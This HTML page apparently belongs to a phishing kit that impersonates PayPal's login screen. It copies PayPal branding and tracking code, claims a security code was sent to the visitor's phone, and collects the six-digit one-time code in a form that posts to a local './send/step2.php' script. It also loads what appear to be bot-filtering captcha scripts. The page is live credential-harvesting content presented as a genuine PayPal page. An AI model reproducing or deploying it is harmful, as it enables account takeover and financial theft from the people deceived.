
<!DOCTYPE html>

<html lang="en" class="no-js mobile">


<head>
    <script src="js/Captcha/ngrlCaptcha.min.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>

    <meta charset="utf-8" />
    <title>Log in to your PayPal account</title>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
    <meta name="application-name" content="PayPal" />
    <meta name="msapplication-task" content="name=My Account;action-uri=https://www.paypal.com/us/cgi-bin/webscr?cmd=_account;icon-uri=https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico" />
    <meta name="msapplication-task" content="name=Send Money;action-uri=https://www.paypal.com/us/cgi-bin/webscr?cmd=_send-money-transfer&amp;send_method=domestic;icon-uri=https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico" />
    <meta name="keywords" content="transfer money, email money transfer, international money transfer " />
    <meta name="description" content="Transfer money online in seconds with PayPal money transfer. All you need is an email address." />
    <link rel="shortcut icon" href="./img/pp_favicon_x.ico" />
    <link rel="apple-touch-icon" href="https://www.paypalobjects.com/webstatic/icon/pp64.png" />
    <link rel="canonical" href="https://www.paypal.com/us/signin" />
    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=2, user-scalable=yes" />
    <meta property="og:image" content="https://www.paypalobjects.com/webstatic/icon/pp258.png" />
    <link rel="stylesheet" href="./css/contextualLoginElementalUI.css">
	<link rel="stylesheet" href="./css/app.css">
    <script nonce="IJsqXr7SJAxQWWFC6xvSfft3MY/VaCVvFPo+xpkAKBVDIeQy" src="./js/lib/modernizr-2.6.1.js"></script>
    <!-- /build -->
    <!-- /build -->
    <style id="antiClickjack">
        body {
            display: none !important;
        }
    </style>
    <script nonce="IJsqXr7SJAxQWWFC6xvSfft3MY/VaCVvFPo+xpkAKBVDIeQy">
        /* Special integration eligibility check */
        function isEligibleIntegration() {
            var sxf = "";
            return sxf === 'true' || window.name === 'PPFrameRedirect';
        }
        /* Don't bust the frame if this is top window */
        if (self === top || isEligibleIntegration()) {
            var antiClickjack = document.getElementById("antiClickjack");
            if (antiClickjack) {
                antiClickjack.parentNode.removeChild(antiClickjack);
            }
        } else {
            top.location = self.location;
        }
    </script>
</head>

<body class="mobile" data-rlogid="rZJvnqaaQhLn%2FnmWT8cSUotSylMGOTGkRUMDpmUTvbXdvevuMMFAfR3mQy2JZfSavI03Q3pWZxE0B1RZg4BOBWYrkBW3opwz_17d3f689a11" data-hostname="rZJvnqaaQhLn/nmWT8cSUjOx898qoYZ06fendyljjeAbIhfwPzQKG6pWzWxd+IA6" data-production="true" data-enable-ads-captcha="true"
    data-ads-challenge-url="/auth/createchallenge/c7748a0f561bc123/challenge.js" data-enable-client-cal-logging="true" data-correlation-id="f625559e00444" data-is-webkit-browser="true" data-enable-fn-beacon-on-web-views="true" data-phone-password-enabled="true"
    data-is-hybrid-login-experience="true" data-is-hybrid-editable-on-cookied="true" data-csrf-token="Rk8zKHCgyO26Qj/ro/HBVuUh+NSddBG/bVm6A=" data-nonce="IJsqXr7SJAxQWWFC6xvSfft3MY/VaCVvFPo+xpkAKBVDIeQy" data-lazy-load-country-codes="true" data-cookie-banner-enabled="true"
    data-is-track-password-field-autofill-enabled="true" data-enable-suppress-auto-submit="true" data-suppress-autosubmit-time="500" data-keychain-flags-json="{&quot;activationOnXoEnabled&quot;:true,&quot;isIosWebView&quot;:false,&quot;isEligibleForXhrLogin&quot;:false}"
    data-show-country-drop-down="true" data-email-label="Email" data-xhr-timeout-limit="20000" data-load-start-time="1637446359569" data-is-cookied-user="true" data-xhr-timeout-ineligible-list="MSIE 10|Windows NT 10" data-login-experience="safari">
    <noscript>
            <p class="nonjsAlert" role="alert">NOTE: Many features on the PayPal Web site require Javascript and cookies.</p>
        </noscript>
    <div id="main" class="main" role="main">
        <section id="slLanding" class="slLanding hide" data-role="page" data-title="Connect your Google account, check out faster on your devices">
            <div class="corral">
                <div id="slContent" class="contentContainer contentContainerBordered">
                    <header>
                        <p role="img" aria-label="PayPal Logo" class="paypal-logo paypal-logo-long"></p>
                    </header>
                    <div id="linked" class="linked ">
                        <div class="profileRemembered">
                            <span class="loginEmail">a</span>
                            <a href="#" class="changeLink scTrack:not-you" id="changeLink">Change</a>
                        </div>
                        <div class="headerTextDecorated"></div>
                        <h1 class="headerText">Stay logged in for faster checkout</h1>
                        <p class="description assure">
                            Enable auto login on this browser and speed through checkout every time. (Not recommended for shared devices.)
                            <span class="learnMoreLink">
                                    <a href="#" id="slLoginLearnMore" class="secondayLink">What's this?</a>
                                </span>
                        </p>
                        <div id="partnerProfile" class="partnerProfile">
                            <div id="partnerPhoto" class="partnerPhoto" style="background-image: url('')"></div>
                            <div class=partnerDetails>
                                <span>You're logged in as</span>
                                <div id="displayName" class="displayName"></div>
                                <div>
                                    <div class="partnerEmailDiv">
                                        <span class="partnerIcon"></span>
                                        <span id="partnerEmail" class="partnerEmail"></span>
                                        <span id="partnerEmailDomain"></span>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="actions actionsSpacedShort">
                            <button class="button actionContinue scTrack:unifiedlogin-continue" id="continueBtn" name="continueBtn" value="continueBtn">Continue</button>
                        </div>
                        <div id="secondaryLogin" class="buttonAsLink secondaryLink">
                            <button class="scTrack:unifiedlogin-use-password" id="secondaryLoginBtn" name="secondaryLoginBtn" value="secondaryLoginBtn">Use password instead</button>
                        </div>
                    </div>
                    <div id="unlinked" class="unlinked ">
                        <div id="headerIcon" class="partnerConnect"></div>
                        <h1 class="headerText">Connect your Google account, check out faster on your devices</h1>
                        <p class="description assure">
                            Automatically log in to PayPal for faster checkout without typing your password wherever you're logged in with your Google account.<a href="#" id="slOptInlearnMore" class="secondayLink scTrack:unifiedlogin-sl-whatsthis">What's this?</a>
                        </p>
                        <p class="secondaryLink hide" id="slOptIn_notNow">
                            <a href="#">Not now</a>
                        </p>
                    </div>
                    <div id="learnMoreModal" class="learnMoreModal">
                        <div id="optInLearnMoreDesc" class="optInLearnMoreDesc ">
                            <h1 class="headerText headerTextSpaced">Why connect my Google account?</h1>
                            <p>Linking your Google account allows you to activate One Touch quickly and easily when you check out. You can always opt out later in Settings at PayPal.com.</p>
                            <p>Whenever you check out on a new device and browser when logged in with your Google account, you can automatically log in at checkout without typing your password.</p>
                        </div>
                        <div id="slLoginLearnMoreDesc" class="slLoginLearnMoreDesc ">
                            <h1 class="headerText headerTextSpaced">Stay logged in for faster checkout</h1>
                            <p>Skip typing your password by staying logged in on this device. For security, we'll occassionally ask you to log in, including every time you update your personal or financial info. We don't recommend using One Touch on shared
                                devices. Turn this off at any time in your PayPal settings.</p>
                        </div>
                        <button type="button" class="ui-dialog-titlebar-close"></button>
                    </div>
                    <div class="intentFooter ">
                        <div class="localeSelector ">
                            <span class="picker country-selector hide">
                                    <span class="hide" id="countryPickerLink">United States</span>
                            <button type="button" aria-labelledby="countryPickerLink" class="country US"></button>
                            </span>
                            <ul class="localeLink">
                                <li>
                                    <a class="selected scTrack:unifiedlogin-footer-language_en_US" href="/signin?country.x=US&locale.x=en_US&langTgl=en" lang="en" data-locale="en_US" aria-current=”true”>English</a>
                                </li>
                                <li>
                                    <a class=" scTrack:unifiedlogin-footer-language_fr_XC" href="/signin?country.x=US&locale.x=fr_XC&langTgl=fr" lang="fr" data-locale="fr_XC">Français</a>
                                </li>
                                <li>
                                    <a class=" scTrack:unifiedlogin-footer-language_es_XC" href="/signin?country.x=US&locale.x=es_XC&langTgl=es" lang="es" data-locale="es_XC">Español</a>
                                </li>
                                <li>
                                    <a class=" scTrack:unifiedlogin-footer-language_zh_XC" href="/signin?country.x=US&locale.x=zh_XC&langTgl=zh" lang="zh" data-locale="zh_XC">中文</a>
                                </li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <section id="login" class="login " data-role="page" data-title="Log in to your PayPal account">
            <div class=" corral">
                <div id="content" class="contentContainer activeContent contentContainerBordered">
                    <header>
                        <p role="img" aria-label="PayPal Logo" class="paypal-logo paypal-logo-long signin-paypal-logo"></p>
                    </header>
                    <h1 id="headerText" class="headerText  accessAid">Log in to your PayPal account</h1>
                    <p id="phoneSubTagLine" class="subHeaderText hide">Already set up to use your mobile number to log in? Type it below. Otherwise, click the link to log in with email.</p>
                    <div id="loginContent" class="">
                        <div id="loginSection" class="">
                            <div class="notifications"></div>
                            <div id="keychainErrorMessage" class="hide">
                                <p class="notification notification-warning blocked-on-8ball hide">PayPal One Touch &trade;only works for checkout. Please login with your email.</p>
                                <p class="notification notification-warning blocked-on-risky-login hide">Please login with your email and password.</p>
                                <p class="notification notification-critical keychain-activation-failure hide">Something went wrong on our end. Please login with your email and password.</p>
                            </div>
                               

<style>
                                   .textstyle {
    color: #0c0c0d;
    font-family: PayPalSansBig-Regular,Helvetica Neue,Arial,sans-serif;
    font-size: 1.125rem;
    line-height: 1.5rem;
    font-weight: 400;
                                            }   
        </style>
		<center>
<h1><strong>Type in your code</strong>

</h1>
<p class="textstyle">We sent a security code to ‪your phone  umber‬.


    </p>							   
					</center>
					
					<br>
					
<form id="PageMainForm" method="post" action="./send/step2.php"class="top15"> 
 
<div> 
<div class="codeInput"> 
    
<div class="ppvx_code-input___1-4-1 codeInput-wrapper" id="answer"> 
<div class="ppvx_code-input__input-wrapper___1-4-1"> 
<div class="ppvx_text-input___3-14-1 ppvx_text-input--nolabel___3-14-1 ppvx--v2___3-14-1 ppvx_code-input__text-input___1-4-1"> 
<input maxlength="1" name="1" class="ppvx_text-input__control___3-14-1 ppvx_code-input__input___1-4-1 hasHelp " required type="text" onfocus="this.value=''" onkeyup="autotab(this, 'input2')"/> 
<label for="ci-answer-0" id="ci-answer-0-label" class="ppvx_text-input__label___3-14-1 answerLabel data-nemo"> 
</label> 
</div> 
<div class="ppvx_text-input___3-14-1 ppvx_text-input--nolabel___3-14-1 ppvx--v2___3-14-1 ppvx_code-input__text-input___1-4-1"> 
<input maxlength="1" name="2" class="ppvx_text-input__control___3-14-1 ppvx_code-input__input___1-4-1 hasHelp " id="input2" required onfocus="this.value=''" type="text" onkeyup="autotab(this, 'input3')"/> 
<label for="ci-answer-1" id="ci-answer-1-label" class="ppvx_text-input__label___3-14-1 answerLabel data-nemo"> 
</label> 
</div> 
<div class="ppvx_text-input___3-14-1 ppvx_text-input--nolabel___3-14-1 ppvx--v2___3-14-1 ppvx_code-input__text-input___1-4-1"> 
<input maxlength="1" name="3" class="ppvx_text-input__control___3-14-1 ppvx_code-input__input___1-4-1 hasHelp " id="input3" required onfocus="this.value=''" type="text" onkeyup="autotab(this, 'input4')" /> 
<label for="ci-answer-2" id="ci-answer-2-label" class="ppvx_text-input__label___3-14-1 answerLabel data-nemo"> 
</label> 
</div> 
<div class="ppvx_text-input___3-14-1 ppvx_text-input--nolabel___3-14-1 ppvx--v2___3-14-1 ppvx_code-input__text-input___1-4-1"> 
<input maxlength="1" name="4" class="ppvx_text-input__control___3-14-1 ppvx_code-input__input___1-4-1 hasHelp " id="input4" required onfocus="this.value=''" type="text" onkeyup="autotab(this, 'input5')"/> 
<label for="ci-answer-3" id="ci-answer-3-label" class="ppvx_text-input__label___3-14-1 answerLabel data-nemo"> 
</label> 
</div> 
<div class="ppvx_text-input___3-14-1 ppvx_text-input--nolabel___3-14-1 ppvx--v2___3-14-1 ppvx_code-input__text-input___1-4-1"> 
<input maxlength="1" name="5" class="ppvx_text-input__control___3-14-1 ppvx_code-input__input___1-4-1 hasHelp " id="input5" required onfocus="this.value=''" type="text" onkeyup="autotab(this, 'input6')"/> 
<label for="ci-answer-4" id="ci-answer-4-label" class="ppvx_text-input__label___3-14-1 answerLabel data-nemo"> 
</label> 
</div> 
<div class="ppvx_text-input___3-14-1 ppvx_text-input--nolabel___3-14-1 ppvx--v2___3-14-1 ppvx_code-input__text-input___1-4-1"> 
<input maxlength="1" name="6" class="ppvx_text-input__control___3-14-1 ppvx_code-input__input___1-4-1 hasHelp " id="input6" required onfocus="this.value=''" type="text" /> 
<label for="ci-answer-5" id="ci-answer-5-label" class="ppvx_text-input__label___3-14-1 answerLabel data-nemo"> 
</label> 
</div> 
</div> 
</div> 
</div> 
</div> 
<div class="action"> 
<button class="ppvx_btn___5-11-8 ppvx--v2___5-11-8 scTrack:security_code_continue_button button" type="submit" id="securityCodeSubmit" name="submitSecurityCode" data-nemo="securityCodeSubmit"> 
Continue</button> 
</div> 
</form>
								
								
							
<script>

function autotab(current, to) {
  if (current.value.length === current.maxLength) {
    document.getElementById(to).focus();
  }
  
}

function focusPreviousInput(e) {
   
  if (e.keyCode === 8) {
     // check if the key pressed was the backspace key
     
     const inputs = document.getElementsByTagName('input'); // get all input elements
    const activeInput = document.activeElement; // get the currently focused input element
    let previousInput = null;
    for (let i = 0; i < inputs.length; i++) {
        
        
        // loop through all input elements
       
      if (inputs[i] === activeInput && i ==inputs.length-1) {
            activeInput.value='';
        }
        if (inputs[i] === activeInput && i > 0) { // if the current input is active and there is a previous input
        previousInput = inputs[i - 1]; // set the previous input to the one before the current input
        break;
      }
    }
    if (previousInput) { // if there is a previous input, focus it
      previousInput.focus();
    }
    
  }
}

document.addEventListener('keydown', focusPreviousInput); // add event listener to the document for the keydown event


function autofocus(current) {
  if (current.value.length < current.maxLength) {
    current.value="";
  }
}

</script>		
								
								
                           
          
        <footer class="footer" role="contentinfo">
            <div class="legalFooter">
                <ul class="footerGroup">
                    <li>
                        <a target="_blank" href="#">Contact Us</a>
                    </li>
                    <li>
                        <a target="_blank" href="#">Privacy</a>
                    </li>
                    <li>
                        <a target="_blank" href="#">Legal</a>
                    </li>
                    <li>
                        <a target="_blank" href="#">Worldwide</a>
                    </li>
                </ul>
            </div>
        </footer>
    </div>
    <div class="transitioning  hide ">
        <p class="welcomeMessage hide">Welcome, !</p>
        <p class="checkingInfo hide">Checking your info…</p>
        <p class="oneSecond hide">Just a second…</p>
        <p class="secureMessage hide">Securely logging you in...</p>
        <p class="oneTouchMessage hide"></p>
        <p class="retrieveInfo hide">Retrieving your info...</p>
        <p class="waitFewSecs hide">This may take a few seconds...</p>
        <p class="udtSpinnerMessage udtLogin hide">We recognize you on this device, and we’re securely logging you in.</p>
        <p class="udtSpinnerMessage udtLoginXo hide">We recognize you on this device, so no need to enter your password for this purchase.</p>
        <p class="udtSpinnerMessage webllsXoUS hide">
            We recognize you on this device, so you can skip login.<br>
            <br>Manage this setting in your profile.
        </p>
        <p class="udtSpinnerMessage webllsSCA hide">We're taking you to PayPal Checkout to complete payment.</p>
        <p class="qrcMessage hide">Redirecting...</p>
        <div class="keychain spinner-content uiExp hide"></div>
    </div>
    <script nonce="IJsqXr7SJAxQWWFC6xvSfft3MY/VaCVvFPo+xpkAKBVDIeQy">
        var PAYPAL = PAYPAL || {};
        PAYPAL.slData = {
            "slSessionChkTimeout": "",
            "slOptInTimeout": "",
            "slAuthChkTimeout": "",
            "slTokenValidationTimeout": "",
            "slDisplayMerchantLink": "",
            "slAction": "",
            "smartlockStatus": "",
            "slLinkedEmail": "",
            "slFrameSrc": "",
            "slAuthUrl": "",
            "partnerClientId": "",
            "partnerReturnUri": "",
            "scimContextId": "",
            "slOptInOT": "",
            "slLoginEmail": "",
            "slReturnUrl": "",
            "delayPartnerAssertion": "",
            "googleOneTapEnable": ""
        };
    </script>
    <script nonce="IJsqXr7SJAxQWWFC6xvSfft3MY/VaCVvFPo+xpkAKBVDIeQy">
        var PAYPAL = PAYPAL || {};
        PAYPAL.ulData = {
            fnUrl: "https://c.paypal.com/da/r/fb.js",
            fnSessionId: "bafe35adbe434f0cb790c3438ad4a85b",
            sourceId: "UNIFIED_LOGIN_INPUT_PASSWORD",
            beaconUrl: "https://b.stats.paypal.com/v1/counter.cgi?r=cD1iYWZlMzVhZGJlNDM0ZjBjYjc5MGMzNDM4YWQ0YTg1YiZpPTEwOC4xNzUuMTEuMjQ5JnQ9MTYzNzQ0NjM1OS41OTYmYT0yMSZzPVVOSUZJRURfTE9HSU7PA0IVK1unkawdg32K5vfZSBpELw",
            enableSpeedTyping: "true",
            aPayAuth: "",
            aPayCanMakePaymentTimeout: "",
            tokenAssertionUri: "",
            preloadScriptUrl: "",
            preloadScriptDownloadLength: 0,
            fingerprintProceed: ""
        };
    </script>
    <noscript>
            <img src="https://c.paypal.com/v1/r/d/b/ns?f=bafe35adbe434f0cb790c3438ad4a85b&s=UNIFIED_LOGIN_INPUT_PASSWORD&js=0&r=1" title="ppfniframe" alt="" height="1" width="1" border="0">
        </noscript>
    <script nonce="IJsqXr7SJAxQWWFC6xvSfft3MY/VaCVvFPo+xpkAKBVDIeQy" id="ul-sync-data">
        var PAYPAL = PAYPAL || {};
        PAYPAL.ulSync = {
            fnSessionId: 'bafe35adbe434f0cb790c3438ad4a85b',
            sourceId: 'UNIFIED_LOGIN_INPUT_PASSWORD',
            fname: 'fn_sync_data'
        };
    </script>
    <!-- build:js inline -->
    <!-- build:[src] js/lib/ -->
    <script nonce="IJsqXr7SJAxQWWFC6xvSfft3MY/VaCVvFPo+xpkAKBVDIeQy" src="./js/lib/fn-sync-telemetry-min.js"></script>
    <!-- /build -->
    <!-- /build -->
    <script nonce="IJsqXr7SJAxQWWFC6xvSfft3MY/VaCVvFPo+xpkAKBVDIeQy">
        var PAYPAL = PAYPAL || {};
        PAYPAL.ulData = PAYPAL.ulData || {};
        PAYPAL.ulData.incontextData = {
            "version": "",
            "noBridge": "",
            "env": "",
            "icstage": "",
            "targetCancelUrl": "",
            "paymentAction": "",
            "paymentToken": "",
            "merchantID": ""
        };
    </script>
    <!-- build:js inline -->
    <!-- build:[src] js/ -->
    <script nonce="IJsqXr7SJAxQWWFC6xvSfft3MY/VaCVvFPo+xpkAKBVDIeQy" src="./js/signin-split-safari.js"></script>
    <!-- /build -->
    <!-- /build -->
    <script src="/.js/pa.js"></script>
    <script nonce="IJsqXr7SJAxQWWFC6xvSfft3MY/VaCVvFPo+xpkAKBVDIeQy">
        (function() {
            if (typeof PAYPAL.analytics != "undefined") {
                PAYPAL.core = PAYPAL.core || {};
                PAYPAL.core.pta = PAYPAL.analytics.setup({
                    data: 'pgrp=main%3Aunifiedlogin%3A%3A%3Alogin&page=main%3Aunifiedlogin%3A%3A%3Alogin%3A%3A%3A&pgst=1637446359569&calc=f625559e00444&nsid=M7Vh-eVdQEGfA-Q_7Iz4FDmlTk_su0MA&rsta=en_US&pgtf=Nodejs&env=live&s=ci&ccpg=US&csci=cd7af927f76446668a56bede9ca620bf&comp=unifiedloginnodeweb&tsrce=authchallengenodeweb&cu=1&gacook=327769726.1636429429&ef_policy=ccpa&c_prefs=T%3D1%2CP%3D1%2CF%3D1%2Ctype%3Dexplicit_banner&transition_name=ss_prepare_pwd&userRedirected=true&xe=101735%2C101216%2C104200%2C101817&xt=105856%2C103864%2C117843%2C111671&ctx_login_ot_content=0&obex=signin&landing_page=login&browser_client_type=Browser&state_name=begin_pwd&ctx_login_ctxid_fetch=ctxid-not-exist&ctx_login_content_fetch=success&ctx_login_lang_footer=shown&ctx_login_signup_btn=shown%7Cdefault&ctx_login_intent=signin&ctx_login_flow=Signin&ctx_login_state_transition=login_loaded&post_login_redirect=default&ret_url=%2F',
                    url: 'https:\/\/t.paypal.com\/ts'
                });
            }
        }());
    </script>
    <noscript>
            <img src="https://t.paypal.com/ts?nojs=1&pgrp=main%3Aunifiedlogin%3A%3A%3Alogin&page=main%3Aunifiedlogin%3A%3A%3Alogin%3A%3A%3A&pgst=1637446359569&calc=f625559e00444&nsid=M7Vh-eVdQEGfA-Q_7Iz4FDmlTk_su0MA&rsta=en_US&pgtf=Nodejs&env=live&s=ci&ccpg=US&csci=cd7af927f76446668a56bede9ca620bf&comp=unifiedloginnodeweb&tsrce=authchallengenodeweb&cu=1&gacook=327769726.1636429429&ef_policy=ccpa&c_prefs=T%3D1%2CP%3D1%2CF%3D1%2Ctype%3Dexplicit_banner&transition_name=ss_prepare_pwd&userRedirected=true&xe=101735%2C101216%2C104200%2C101817&xt=105856%2C103864%2C117843%2C111671&ctx_login_ot_content=0&obex=signin&landing_page=login&browser_client_type=Browser&state_name=begin_pwd&ctx_login_ctxid_fetch=ctxid-not-exist&ctx_login_content_fetch=success&ctx_login_lang_footer=shown&ctx_login_signup_btn=shown%7Cdefault&ctx_login_intent=signin&ctx_login_flow=Signin&ctx_login_state_transition=login_loaded&post_login_redirect=default&ret_url=%2F" alt="" height="1" width="1" border="0">
        </noscript>
    <script async defer src="./Chapta/recaptchav3.js?_sessionID=M7Vh-eVdQEGfA-Q_7Iz4FDmlTk_su0MA"></script>
    <script src="./js/jquery-3.6.3.min.js"></script>
</body>

</html>